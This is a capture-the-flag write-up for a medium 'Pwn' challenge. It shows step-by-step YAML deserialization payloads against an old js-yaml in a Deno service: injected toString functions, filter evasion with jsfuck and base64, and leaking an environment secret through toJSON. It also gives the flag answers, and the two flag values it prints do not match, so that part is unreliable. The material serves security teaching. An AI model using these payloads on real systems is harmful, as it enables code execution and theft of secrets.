# Green Revolution

## Category
Pwn

## Estimated difficulty
Medium

## Description
JS YAML injection challenge with a twist of requiring a self-modification of toJSON to get the flag.

## Scenario
  Finally, after months of waiting for our devs to finish our new case management system, we're gonna get it next week!
  I got so excited, I wanted to waste less time porting over our cases by hand, so I quickly put together a quick migration script.
  I reused one of the old flag-getting edge functions on our production server, hopefully it isn't gonna be a problem... is it?

## Write-up
This challenge fundamentally is composed of three parts:
- Injecting YAML
- Bypassing the primitive filter
- Getting said injected YAML to actually do something

The challenge is whitebox, so let's see what we can gather from the index.ts:
- It's in typescript
- It runs on Deno
- It uses a specific and outdated version of js yaml, 3.0.0
- It has a fairly large wordlist at the bottom, used to filter out "bad files"
- It does rudimentary runtime type checking

From all of this, we can already gather:
- The injection is going to be through YAML
- The wordlist could be a problem
- The type checking could be a problem

Let's find a common YAML injection examples for JS:
`"toString": !<tag:yaml.org,2002:js/function> "function (){very_evil_thing();}"`

If we append it at the bottom of the file, well, we realize that it's never called.
Drat.

Let's try something else, because one thing that DOES read the entire structure is the JSON returning response!
`"toJSON": !<tag:yaml.org,2002:js/function> "function (){very_evil_thing();}"`
...and we're blocked. Welp, there comes the wordlist. Back to toString.

Let's put it somewhere else, like, some value on which toString is called!
`newAssessment.projectId = String(oldAssessment.projectId);` does, so, let's overwrite projectID with an object:

```yaml
projectId:
- "toString": !<tag:yaml.org,2002:js/function> "function (){very_evil_thing();}"
```
...And now, we run into the runtime type checking.

Let's go deeper, what does the type checking *actually* check?

```ts
function isEnvironmentalImpactAssessment(obj: any): obj is EnvironmentalImpactAssessment {
	return obj &&
		typeof obj.projectId === 'string' &&
		typeof obj.projectName === 'string' &&
		typeof obj.projectDescription === 'string' &&
		obj.projectLocation &&
		typeof obj.projectLocation.latitude === 'number' &&
		typeof obj.projectLocation.longitude === 'number' &&
		Array.isArray(obj.environmentalData) &&
		Array.isArray(obj.impactAssessments) &&
		Array.isArray(obj.mitigationStrategies) &&
		Array.isArray(obj.complianceRecords);
}
```

Pretty much just the first layer, it doesn't check any of the children objects.
Do we have anything in there that has toString called on it? Yes!

```ts
console.log(`converting comp record ${record.complianceType}`)
data: String(data.dataValue), //(from environmentalData)
console.log(`fixme: strategies are not filtered yet ${strategy.strategyType}`)
```

Any of these three things will be toString'd, but are not type checked, I picked complianceType myself.

```yaml
complianceRecords:
- complianceType:
  - "toString": !<tag:yaml.org,2002:js/function> "function (){return 'coolThing'}"
```

If we run it now, we can see that in the server logs, we see `coolThing`, injection achieved! We won!
...well, only partly, we still ain't got no flag.

Let's try to grab the flag!
```yaml
complianceRecords:
- complianceType:
  - "toString": !<tag:yaml.org,2002:js/function> "function (){ return retrieveFlag() }"
```
...damn word filter. `jsfuck` it.

```yaml
complianceRecords:
- complianceType:
  - "toString": !<tag:yaml.org,2002:js/function> "function (){ return [][(![]+[])[+[]]+(![]+[..."
```

We're not allowed to access that scope. Damn.

Can we access the flag directly, though?
```yaml
complianceRecords:
- complianceType:
  - "toString": !<tag:yaml.org,2002:js/function> "function (){ return Deno.env.get('FLAG') }"
```

We can see the flag in the server logs. That's cool, but we don't have the *actual* server logs.
How can we exfiltrate the flag?
As we have no access to the parent scope, nor can we interrupt it by returning a value.

Well, we still have our old friend toJSON. Blocked by the word filter you say? Well, say no more, because I've literally got eval() right there to bypass it for me, and add it dynamically to the parsed object:
```yaml
complianceRecords:
- complianceType:
  - "toString": !<tag:yaml.org,2002:js/function> "function (){this['toJSON'] = function(){ return Deno.env.get('FLAG') }}"
```
...oh, right, the word filter.
```yaml
complianceRecords:
- complianceType:
  - "toString": !<tag:yaml.org,2002:js/function> "function (){this[atob('dG9KU09O')] = function(){ return [][(![]+[])[+[]]+..."
```

And we can finally see the flag in the returned JSON:
```json
    "complianceRecords": [
        {
            "policyName": [
                "CSC{1_5we4r_my_c4rb0n_fo0tprin7_i5_0v3rwh3lm1ng}"
            ],
```


## Solve script
POST a request with the exploit.yaml file in resources

## Flag
CSC{s0m3o1_br0k3_th1s_w45_1t_y0u}

## Creator
Th√©o Davreux

## Creator bio
:dancing_android_rainbow_blobmoji: